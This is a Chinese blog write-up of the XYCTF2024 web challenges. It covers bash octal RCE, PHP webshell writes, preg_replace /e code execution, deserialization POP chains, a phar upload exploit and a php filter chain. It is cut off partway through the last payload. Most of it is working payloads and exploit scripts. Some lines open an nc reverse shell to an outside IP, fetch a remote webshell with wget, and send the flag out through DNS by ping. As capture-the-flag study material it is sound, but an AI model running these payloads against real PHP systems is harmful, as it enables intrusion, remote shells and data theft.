---
title: XYCTF2024复现
date: 2025-09-15 21:33:47
tags:
- bash内建命令
- 八进制rce
- bash语法Here-String
- preg_replace命令执行
- wget
- 0a绕过
- 外带数据
- __halt_compiler
- php_filter_chain
categories:
- 比赛复现
---

# XYCTF2024复现

## WEB

### ezMake

![](../image/XYCTF2024-1.png)

PATH 环境变量被显式地设定为空。这段 Makefile 的逻辑检查了 PATH 是否未定义，如果未定义则设为空，如果已定义也重设为空。由于 PATH 被设置为空，shell 将无法定位到除内置命令之外的任何外部命令的位置。

Bash 内建命令

这些命令是由Bash自身提供，而不是独立的程序：

    alias - 定义或显示别名。
    cd - 改变当前目录。
    echo - 输出参数到标准输出。
    exit - 退出当前shell。
    export - 设置或显示环境变量。
    history - 显示命令历史记录。
    pwd - 打印当前工作目录的路径。
    read - 从标准输入读取一行数据。
    set - 设置或取消设置shell选项和位置参数。
    type - 显示一个命令的类型。
    unset - 删除变量或函数的定义。
首先先测试一下

```
echo "sb"
```

发现成功执行

直接使用echo写马会有waf

```
echo "<?= eval($_POST[1]);?>" > shell.php
```

base64绕过也不行

```
echo "PD89IGV2YWwoJF9QT1NUWzFdKTs/Pg==" | base64 -d > shell.php
```

然后发现hex2bin可以绕过

```
echo '<?=eval(hex2bin("6576616c28245f504f53545b22636d64225d293b"))?>' > shell.php

6576616c28245f504f53545b22636d64225d293b
# eval($_POST["cmd"]);
```

成功写马，拿到flag

![](../image/XYCTF2024-2.png)

其他解法：

利用十六进制绕过然后利用xxd解码最后用反引号执行

```
`echo "636174202F666C6167" | xxd -r -p`
```

---

还有个逆天的解法，直接访问/flag即可拿到flag

---

### ezRCE

源码：

```
<?php
highlight_file(__FILE__);
function waf($cmd){
    $white_list = ['0','1','2','3','4','5','6','7','8','9','\\','\'','$','<']; 
    $cmd_char = str_split($cmd);
    foreach($cmd_char as $char){
        if (!in_array($char, $white_list)){
            die("really ez?");
        }
    }
    return $cmd;
}
$cmd=waf($_GET["cmd"]);
system($cmd);
really ez?
```

发现是个rce，并且使用了白名单

只能使用数字和四个符号。

在shell环境中有一种特殊的表示字符的序列。在这种表示法中，\ 后面跟着一个八进制数，表示该字符的 ASCII 值。在bash中有一种特殊字符的引用的方式——$''（称为 ANSI-C quoting）它允许你在字符串中使用 ANSI C 转义序列来表示特殊字符或者 ASCII 控制字符。

例如：

```
$'\154\163'			# ls
```

这里刚好有'、$、\、数字可以用

一个字符串转8进制的脚本

```
def string_to_octal(input_str):
    octal_str = ""
    for char in input_str:
        octal_char = oct(ord(char))[2:]
        octal_str += "\\" + octal_char.zfill(3)
    return octal_str
 
input_str = "指定字符串"
octal_output = string_to_octal(input_str)
print(octal_output)
```

先试试

```
?cmd=$'\154\163'
```

成功执行了ls

试试`ls /`

```
?cmd=$'\154\163\040\057'
```

执行失败，在本地尝试可以看到其直接将单引号包裹的内容整体当成了一个命令，不能直接利用

---

这里要用到bash的特殊语法

Here String，用于将字符串作为命令的标准输入提供给命令。它的语法形式是 <<<，后跟一个字符串，形如：

```
command <<< "string"
```

这里的 command 可以是任何接受标准输入的命令，而 string 则是要提供给该命令的字符串。

在本地尝试

```
bash <<< "ls /"

bash <<< $'\154\163\040\057'

发现成功执行
```

将bash和后面的命令都转为8进制形式

```
?cmd=$'\142\141\163\150'<<<$'\154\163\040\057'
```

成功执行

![](../image/XYCTF2024-3.png)

读取flag

```
?cmd=$'\142\141\163\150'<<<$'\143\141\164\040\057\146\154\141\147'
```

---

### warm up

源码：

```
<?php
include 'next.php';
highlight_file(__FILE__);
$XYCTF = "Warm up";
extract($_GET);

if (isset($_GET['val1']) && isset($_GET['val2']) && $_GET['val1'] != $_GET['val2'] && md5($_GET['val1']) == md5($_GET['val2'])) {
    echo "ez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if (isset($md5) && $md5 == md5($md5)) {
    echo "ezez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if ($XY == $XYCTF) {
    if ($XY != "XYCTF_550102591" && md5($XY) == md5("XYCTF_550102591")) {
        echo $level2;
    } else {
        die("什么情况,这么基础的md5做不来");
    }
} else {
    die("学这么久,传参不会传?");
}

什么情况,这么基础的md5做不来
```

经典md5，基本就是弱类型比较

payload：

```
?val1=240610708&val2=314282422&md5=0e215962017&XY=240610708&XYCTF=240610708
```

然后给我们一个php文件名，访问LLeeevvveeelll222.php

源码：

```
<?php
highlight_file(__FILE__);
if (isset($_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval($_POST['a'])) {
    echo "操作你O.o";
    echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);  // 我可不会像别人一样设置10来个level
} else {
    die("有点汗流浃背");
}

有点汗流浃背
```

数组绕过preg_match和intval

```
a[]=123
```

然后再用preg_replace命令执行

**preg_replace()的/e修饰符代码执行漏洞**

漏洞点：

```
echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);
```

---

```
?a=/(\S*)/e&b=\1&c=`$_POST[1]`
```

`a=/(\S*)/e` : 这是一个参数。值为 `/(\S*)/e`，它是一个正则表达式。

- `(\S*)` : 匹配任意非空白字符（0个或多个）。
- `/e` : 这是**关键**。它是`preg_replace()`函数的一个**已废弃的修饰符**。它的作用是将匹配到的文本作为PHP代码来执行，而不仅仅是进行字符串替换。

`&` : 参数分隔符。

`b=\1` : 这是另一个参数。值为 `\1`。在正则表达式的替换字符串中，`\1` 是一个**反向引用**，它代表第一个括号捕获组 `(\S*)` 所匹配到的内容。

`&` : 参数分隔符。

`c=`$_POST[1]`` : 第三个参数。值为 `$_POST[1]` 。这里的反引号 **`** 在PHP中与`shell_exec()`函数等效，用于执行操作系统命令。`$_POST[1]`表示攻击者希望通过HTTP POST请求发送一个名为`1` 的参数，该参数的值就是他们要执行的系统命令。

---

payload：

```
GET:
?a=/(\S*)/e&b=\1&c=`$_POST[1]`

POST:
a[]=123&1=cat /flag     
```

---

### ezhttp

首先看到一个登录界面，然后找到robots.txt里面有账号和密码

然后就是一系列的http八股

![](../image/XYCTF2024-4.png)

那么就修改referer请求头

```
yuanshen.com
```

然后看回显

![](../image/XYCTF2024-5.png)

再修改User-Agent头：

```
User-Agent: XYCTF
```

继续看回显：

![](../image/XYCTF2024-6.png)

先使用回环地址添加到xff(X-Forwarded-For)头

```
X-Forwarded-For: 127.0.0.1
```

回显后发现xff被禁了

使用Client-ip头代替

```
Client-ip: 127.0.0.1
```

回显发现需要设置代理，但是Xff头被禁，使用Via头代替

```
Via: ymzx.qq.com
```

最后回显提示需要修改cookie，添加一个XYCTF就行

```
XYCTF=1
```

拿到flag

---

### ezClass

源码：

```
<?php
highlight_file(__FILE__);
$a=$_GET['a'];
$aa=$_GET['aa'];
$b=$_GET['b'];
$bb=$_GET['bb'];
$c=$_GET['c'];
((new $a($aa))->$c())((new $b($bb))->$c());
```

很明显这里要使用PHP原生类

这里有很多解法

**利用Error原生类打命令执行**

payload：

```
?a=Error&aa=system&b=Error&bb=cat /f*&c=getMessage
```

解释：

创建了一个 `Error` 类的对象（异常对象）。构造函数的参数 `'system'` 成为了这个错误对象的**消息（Message）**。用 `Error` 对象的 `getMessage()` 方法。这个方法的作用就是**返回创建对象时传入的消息字符串**。所以，`$result1` 的值现在是字符串 `'system'`。

创建了第二个 `Error` 对象，其消息是 `'cat /f*'`。

同样调用 `getMessage()` 方法，所以，`$result2` 的值现在是字符串 `'cat /f*'`。

最终调用：$result1($result2);

```
system('cat /f*');
```

---

其他payload：

**直接文件读取**

```
?a=SplFileObject&aa=php://filter/convert.base64-encode/resource=/flag&c=__toString
```

直接利用SplFileObject原生类文件读取

---

### ez?Make

![](../image/XYCTF2024-7.png)

这题不能用echo写马了

但是也把/bin下的命令放了出来，不再有PATH的限制

依然可以用上一题的第二个payload：

```
`echo "636174202F666C6167" | xxd -r -p`
```

其他payload：

知道flag路径在/flag，所以可以使用多次cd切换到上一目录然后再读文件，并且发现很多读文件的命令都被过滤了，但是more和rev还能用

所以payload：

```
cd ..&&cd ..&&cd ..&&cd ..&&cd ..&&more [0-z][0-z][0-z][0-z]
或
cd ..&&cd ..&&cd ..&&cd ..&&cd ..&&rev [0-z][0-z][0-z][0-z]
或
cd ..&&cd ..&&cd ..&&cd ..&&cd ..&&more `echo "666c6167" | xxd -r -p`
```

---

### ezmd5

一进去要求我们上传两张图片，再根据题目猜测需要两张图片并不相同，但通过MD5比较相同

可以使用fastcoll来构造碰撞图片，这里直接网上找两张方便使用

![](../image/XYCTF2024-8.png)

![](../image/XYCTF2024-9.png)

拿到flag

![](../image/XYCTF2024-10.png)

---

### 牢牢记住，逝者为大

```
<?php
highlight_file(__FILE__);
function Kobe($cmd)
{
    if (strlen($cmd) > 13) {
        die("see you again~");
    }
    if (preg_match("/echo|exec|eval|system|fputs|\.|\/|\\|/i", $cmd)) {
        die("肘死你");
    }
    foreach ($_GET as $val_name => $val_val) {
        if (preg_match("/bin|mv|cp|ls|\||f|a|l|\?|\*|\>/i", $val_val)) {
            return "what can i say";
        }
    }
    return $cmd;
}

$cmd = Kobe($_GET['cmd']);
echo "#man," . $cmd  . ",manba out";
echo "<br>";
eval("#man," . $cmd . ",mamba out");

#man,,manba out
```

注意到eval这里用了字符串拼接的方式 

PHP中的`eval()`函数可以执行多行命令，但如果其中的某一行命令出现错误，PHP 解释器将会停止执行并抛出一个致命错误，索性这个man已经被注释了，为了命令执行，我们需要做的就是换行和注释掉mamba out

关于命令执行，因为限长，所以考虑用`$_GET[1]`来转接 

但是这里有很多限制连curl都打不了，然后echo写马也不行，但是可以用

**wget下载远程文件写马**

payload：

 %0a换行绕过前面的注释符,然后%23注释掉后面的内容

攻击机上配置php解析成文本，让目标机读取到php完整内容。

```
?cmd=%0a`$_GET[1]`;%23&1=wget ip/yjh.php
```

成功写马

然后用蚁剑连接

---

其他解法

**nc反弹shell：**

```
?cmd=%0a`$_GET[1]`;%23&1=nc 124.222.136.33 1337 -e /bi''n/sh
```

这里bin被过滤了使用''绕过

---

**ping命令DNSlod外带**

```
?cmd=%0a`$_GET[1]`;%23&1=ping%20`sort%20/[e-h][k-m][0-b][e-h]`.12bc25135b.ipv6.1433.eu.org
```

---

**八进制绕过+文件写入**

可以使用cp命令来将/flag复制到当前目录的m文件下，这样就可直接访问

```
?cmd=%0a`$_GET[1]`;%23&1=cp /flag m
经过八进制转换后

?cmd=%0a`$_GET[1]`;%23&1=$'\143\160'+$'\057\146\154\141\147'+$'\155'
```

然后直接访问/m即可拿到flag

---

### ezPOP

源码：

```
<?php
error_reporting(0);
highlight_file(__FILE__);

class AAA
{
    public $s;
    public $a;
    public function __toString()
    {
        echo "you get 2 A <br>";
        $p = $this->a;
        return $this->s->$p;
    }
}

class BBB
{
    public $c;
    public $d;
    public function __get($name)
    {
        echo "you get 2 B <br>";
        $a=$_POST['a'];
        $b=$_POST;
        $c=$this->c;
        $d=$this->d;
        if (isset($b['a'])) {
            unset($b['a']);
        }
        call_user_func($a,$b)($c)($d);
    }
}

class CCC
{
    public $c;

    public function __destruct()
    {
        echo "you get 2 C <br>";
        echo $this->c;
    }
}


if(isset($_GET['xy'])) {
    $a = unserialize($_GET['xy']);
    throw new Exception("noooooob!!!");
}
```

反序列化构造链子

```
CCC.__destruct->AAA.__toString->BBB.__get
```

重点来了：

```
call_user_func($a,$b)($c)($d);
```

这里$b是一个数组，题目里`unset($b['a'])`，将数组里a的传参元素删去了。

所以这里需要用到数组操作函数。

这里我们使用current，它会返回数组的第一个元素

`current()` 是 PHP 中用于处理**数组**的一个内置函数。它的核心作用是：**返回数组内部指针当前指向的元素的值**。

其他数组操作函数

**`next($array)`**： 将内部指针**向前**（向右）移动一位，然后返回新指针位置的值。

**`prev($array)`**： 将内部指针**向后**（向左）移动一位，然后返回新指针位置的值。

**`end($array)`**： 将内部指针**快速移动**到数组的最后一个元素，并返回其值。

**`reset($array)`**： 将内部指针**重置**到数组的第一个元素，并返回其值。

___

所以call_user_func("current",$b)的返回值完全可控，我们可以使其为sprintf

因为在php中()可以将字符串作为函数来处理

例如：

```
<?php
$var=sprintf("phpinfo");
$var();
```

可以成功调用phpinfo()

所以我们构造

```
<?php
$b = array(0=>"sprintf");

call_user_func("current",$b)("system")("cat /f*");
```

并且要用gc回收绕过抛错

exp：

```
<?php

class AAA
{
    public $s;
    public $a;

}

class BBB
{
    public $c;
    public $d;

}

class CCC
{
    public $c;

}

$a = new CCC();
$a->c = new AAA();
$a->c->s = new BBB();
$a->c->s->c = "system";
$a->c->s->d = "cat /f*";
$b=array("a"=>$a,"b"=>null);

$c=serialize($b);
$d=str_replace('s:1:"b";N', 's:1:"a";N',$c);
echo urlencode($d);
```

这里也可以直接这么调用（不需要sprintf），虽然会报错，但是也能执行

```
call_user_func("current",$b)("cat /f*")();

# $b=array(0=>"system")
```

payload：

```
?xy=a%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22CCC%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A2%3A%7Bs%3A1%3A%22c%22%3Bs%3A6%3A%22system%22%3Bs%3A1%3A%22d%22%3Bs%3A7%3A%22cat+%2Ff%2A%22%3B%7Ds%3A1%3A%22a%22%3BN%3B%7D%7Ds%3A1%3A%22a%22%3BN%3B%7D

POST：
a=current&0=sprintf
```

---

这题还有另一种解法，就是用原生类Closure的静态方法fromCallable双重嵌套调用

这样：

```
call_user_func("Closure::fromCallable","Closure::fromCallable")("system")("cat /f*");
```

由于这里的$b是一个数组，而不是字符串，所以无法把`Closure::fromCallable`当做字符串穿进去。

这里需要用到php的一个特性

```
<?php

$b[0]='Closure';
$b[1]='fromCallable';

$b('system')('whoami');
```

PHP 的可调用值（callable）特性。PHP 允许数组作为可调用对象，格式为 [类名或对象, 方法名]。

所以 $b 数组在这里被解释为 ['Closure', 'fromCallable']，这意味着调用 Closure 类的 fromCallable 静态方法。

注意：这里的数组必须是索引数组，不能是键值对，否则无法调用

exp和payload这里就不放了

---

### ezSerialize

源码：

```
<?php
include 'flag.php';
highlight_file(__FILE__);
error_reporting(0);

class Flag {
    public $token;
    public $password;

    public function __construct($a, $b)
    {
        $this->token = $a;
        $this->password = $b;
    }

    public function login()
    {
        return $this->token === $this->password;
    }
}

if (isset($_GET['pop'])) {
    $pop = unserialize($_GET['pop']);
    $pop->token=md5(mt_rand());
    if($pop->login()) {
        echo $flag;
    }
}
```

这里一个简单的引用绕过即可

exp

```
<?php

class Flag{
    public $token;
    public $password;

}

$a = new Flag();
$a->token = &$a->password;
echo urlencode(serialize($a));
```

payload：

```
?pop=O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A5%3A%22token%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D

#fpclosefpclosefpcloseffflllaaaggg.php
```

访问fpclosefpclosefpcloseffflllaaaggg.php

```
<?php
highlight_file(__FILE__);
class A {
    public $mack;
    public function __invoke()
    {
        $this->mack->nonExistentMethod();
    }
}

class B {
    public $luo;
    public function __get($key){
        echo "o.O<br>";
        $function = $this->luo;
        return $function();
    }
}

class C {
    public $wang1;

    public function __call($wang1,$wang2)
    {
            include 'flag.php';
            echo $flag2;
    }
}


class D {
    public $lao;
    public $chen;
    public function __toString(){
        echo "O.o<br>";
        return is_null($this->lao->chen) ? "" : $this->lao->chen;
    }
}

class E {
    public $name = "xxxxx";
    public $num;

    public function __unserialize($data)
    {
        echo "<br>学到就是赚到!<br>";
        echo $data['num'];
    }
    public function __wakeup(){
        if($this->name!='' || $this->num!=''){
            echo "旅行者别忘记旅行的意义!<br>";
        }
    }
}

if (isset($_POST['pop'])) {
    unserialize($_POST['pop']);
}
```

这里有个特性

调用 `unserialize()` 函数时。但是，**只有当类中定义了 `__unserialize()` 方法时**，它才会被调用。如果存在该方法，PHP会将从序列化字符串中提取出的属性数组作为**唯一参数**传递给它，而**不会**再自动设置任何属性，也**不会**调用 `__wakeup()` 方法。

在类中存在`__unserialize()`魔术方法时，`__wakeup()`**方法会被完全忽略，不会执行**

反序列化链子：

```
E.__unserialize->D.__toString->B.__get->A.__invoke->C.__call
```

exp：

```
<?php
class A {
    public $mack;
}

class B {
    public $luo;
}

class C {
    public $wang1;
}


class D {
    public $lao;
    public $chen;
}

class E {
    public $name;
    public $num;
}


$a = new E();
$a->num = new D();
$a->num->lao = new B();
$a->num->lao->luo = new A();
$a->num->lao->luo->mack =new C();

echo urlencode(serialize($a));
```

payload：

```
POST：

pop=O%3A1%3A%22E%22%3A2%3A%7Bs%3A4%3A%22name%22%3BN%3Bs%3A3%3A%22num%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A3%3A%22lao%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22luo%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22mack%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A5%3A%22wang1%22%3BN%3B%7D%7D%7Ds%3A4%3A%22chen%22%3BN%3B%7D%7D

# saber_master_saber_master.php
```

访问saber_master_saber_master.php

```
<?php

error_reporting(0);
highlight_file(__FILE__);

// flag.php
class XYCTFNO1
{
    public $Liu;
    public $T1ng;
    private $upsw1ng;

    public function __construct($Liu, $T1ng, $upsw1ng = Showmaker)
    {
        $this->Liu = $Liu;
        $this->T1ng = $T1ng;
        $this->upsw1ng = $upsw1ng;
    }
}

class XYCTFNO2
{
    public $crypto0;
    public $adwa;

    public function __construct($crypto0, $adwa)
    {
        $this->crypto0 = $crypto0;
    }

    public function XYCTF()
    {
        if ($this->adwa->crypto0 != 'dev1l' or $this->adwa->T1ng != 'yuroandCMD258') {
            return False;
        } else {
            return True;
        }
    }
}

class XYCTFNO3
{
    public $KickyMu;
    public $fpclose;
    public $N1ght = "Crypto0";

    public function __construct($KickyMu, $fpclose)
    {
        $this->KickyMu = $KickyMu;
        $this->fpclose = $fpclose;
    }

    public function XY()
    {
        if ($this->N1ght == 'oSthing') {
            echo "WOW, You web is really good!!!\n";
            echo new $_POST['X']($_POST['Y']);
        }
    }

    public function __wakeup()
    {
        if ($this->KickyMu->XYCTF()) {
            $this->XY();
        }
    }
}


if (isset($_GET['CTF'])) {
    unserialize($_GET['CTF']);
}
```

发现利用点

```
echo new $_POST['X']($_POST['Y']);
```

这里可以使用原生类来读取文件

反序列化链子

```
XYCTFNO3.__wakeup->XYCTFNO2.XYCTF->XYCTFNO3.XY->new SplFileObject("php://filter/convert.base64-encode/resource=flag.php")
```

exp：

```
<?php

class XYCTFNO1
{
    public $Liu;
    public $T1ng;
    private $upsw1ng;

}

class XYCTFNO2
{
    public $crypto0;
    public $adwa;

}

class XYCTFNO3
{
    public $KickyMu;
    public $fpclose;
    public $N1ght;

}


$a = new XYCTFNO3();
$a->N1ght = "oSthing";
$a->KickyMu = new XYCTFNO2();
$a->KickyMu->adwa = new XYCTFNO1();
$a->KickyMu->adwa->crypto0 = "dev1l";
$a->KickyMu->adwa->T1ng = "yuroandCMD258";

echo urlencode(serialize($a));

```

payload：

```
?CTF=O%3A8%3A%22XYCTFNO3%22%3A3%3A%7Bs%3A7%3A%22KickyMu%22%3BO%3A8%3A%22XYCTFNO2%22%3A2%3A%7Bs%3A7%3A%22crypto0%22%3BN%3Bs%3A4%3A%22adwa%22%3BO%3A8%3A%22XYCTFNO1%22%3A4%3A%7Bs%3A3%3A%22Liu%22%3BN%3Bs%3A4%3A%22T1ng%22%3Bs%3A13%3A%22yuroandCMD258%22%3Bs%3A17%3A%22%00XYCTFNO1%00upsw1ng%22%3BN%3Bs%3A7%3A%22crypto0%22%3Bs%3A5%3A%22dev1l%22%3B%7D%7Ds%3A7%3A%22fpclose%22%3BN%3Bs%3A5%3A%22N1ght%22%3Bs%3A7%3A%22oSthing%22%3B%7D

POST：
X=SplFileObject&Y=php://filter/convert.base64-encode/resource=flag.php
```

解码之后即可得到flag

---

### pharme

打开后发现是一个文件上传页面，查看网页源代码，发现提示

```
class.php
```

class.php

```
<?php
error_reporting(0);
highlight_file(__FILE__);
class evil{
    public $cmd;
    public $a;
    public function __destruct(){
        if('ch3nx1' === preg_replace('/;+/','ch3nx1',preg_replace('/[A-Za-z_\(\)]+/','',$this->cmd))){
            eval($this->cmd.'isbigvegetablechicken!');
        } else {
            echo 'nonono';
        }
    }
}

if(isset($_POST['file']))
{
    if(preg_match('/^phar:\/\//i',$_POST['file']))
    {
        die("nonono");
    }
    file_get_contents($_POST['file']);
}


```

preg_replace('/;+/','ch3nx1',preg_replace('/[A-Za-z_]+/','',$this->cmd)))这段正则是将输入中的字母、下划线和括号都移除，并将连续的分号替换为字符串 'ch3nx1' ，最后与'ch3nx1'比较判真

其实就是个白名单，只能含有字母A-Z，a-z，下划线_和左右括号()，其实也就是无参RCE
 此外，eval中的字符串是拼接的，且不能用#和//进行注释，所以需要用__halt_compiler来终止编译才能正常执行

#### __halt_compiler

在 PHP 中，__halt_compiler() 是一个特殊的语言结构，用于在脚本中立即停止编译器的解析。这意味着，该函数之后的任何 PHP 代码都不会被编译器解析为 PHP 代码，但这些数据依然可以作为文件的一部分存在，可以通过 PHP 的 I/O 函数访问。

使用场景和目的：

    数据存储：__halt_compiler() 常见于将数据直接嵌入到 PHP 脚本文件中的情况。这使得可以在一个文件中同时包含执行代码和非执行数据，如安装脚本、自解压脚本等。
    混合内容：可以在 PHP 文件中混合使用 PHP 代码和任意其他数据，不需要担心编译器会尝试解析那些非 PHP 数据。
    创建 PHAR 文件：PHAR (PHP Archive) 文件格式广泛使用 __halt_compiler() 来分隔 PHAR 元数据和包含的文件数据。
---

首先构造并生成phar包

```
<?php
class evil{
    public $cmd="eval(end(getallheaders()));__halt_compiler();";   //写shell
}
@unlink('poc.phar');   //删除之前的test.phar文件(如果有)
$phar=new Phar('poc.phar');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
$o=new evil();
$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
```

然后gz压缩一下绕过文件内容过滤

然后发包修改后缀名和content-type为png

上传成功后得到文件路径

```
Saved to: /tmp/23f1a0f70f076b42b5b49f24ee28f696.png
```

然后还需要过滤掉phar开头的过滤，使用filter伪协议+phar伪协议

payload：

```
POST：
file=php://filter/convert.base64-encode/resource=phar:///tmp/23f1a0f70f076b42b5b49f24ee28f696.png
```

然后抓包在http请求头末尾添加

```
cmd: system('tac /f*');
```

拿到flag

---

### 连连看到底是连连什么看

首先打开是一个连连看小游戏，点击about发现文件包含。

尝试包含index.php，提示/what's_this.php

访问/what's_this.php

what's_this.php

```
<?php
highlight_file(__FILE__);
error_reporting(0);

$p=$_GET['p'];

if(preg_match("/http|=|php|file|:|\/|\?/i", $p))
{
    die("waf!");
}

$payload="php://filter/$p/resource=/etc/passwd";

if(file_get_contents($payload)==="XYCTF"){
    echo file_get_contents('/flag');
}
```

#### php_filter_chain

**PHP-Filter-Chain**（PHP过滤器链）是一种高级的 Web 攻击技术，它利用了 PHP 内置的**过滤器**功能来构造恶意 payload，主要用于**文件读取**和**任意代码执行**。它特别适用于那些对输入进行了严格过滤，但依然使用了 `include` 或 `file_get_contents()` 等函数的场景。

简单来说，它就像是将多个 PHP 过滤器像链条一样连接起来，让原始输入经过一系列转换，最终变成攻击者期望的恶意代码或文件路径。

---

#### string.strip_tags

这个过滤器的两个关键特性：

1. **去除 PHP/HTML 标签**
2. **对非 UTF-8 文本返回空字符串或净化后的文本**

---

这题很明显是php_filter_chain，这里我们使用工具php_filter_chain_generator

```
python php_filter_chain_generator.py --chain "XYCTF"
```

生成了php_filter_chain

```
[+] The following gadget chain will generate the following code : XYCTF (base64 value: WFlDVEY)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

去掉后面的/resource=php://temp与前面的php://filter/

```
convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode
```

在linux下尝试，发现成功构造出XYCTF，但是后面有大量的脏数据

手动加string.strip_tags过滤器来去除php标签

构造XYCTF<?php

```
python php_filter_chain_generator.py --chain "XYCTF<?php"
```

为什么要构造XYCTF<?php

```
原始输出: XYCTF<?php       （8个字符）
↓ string.strip_tags 处理
去除 <?php 标签
最终输出: XYCTF            （5个字符，纯净）
```

这样做的**好处**是：

- 提供了一个明确的"切割点"让 `strip_tags` 工作
- `<?php` 是一个明确的 PHP 标签，`strip_tags` 会可靠地去除它
- 避免了依赖不可预测的脏数据截断

---

最终payload：

```
convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.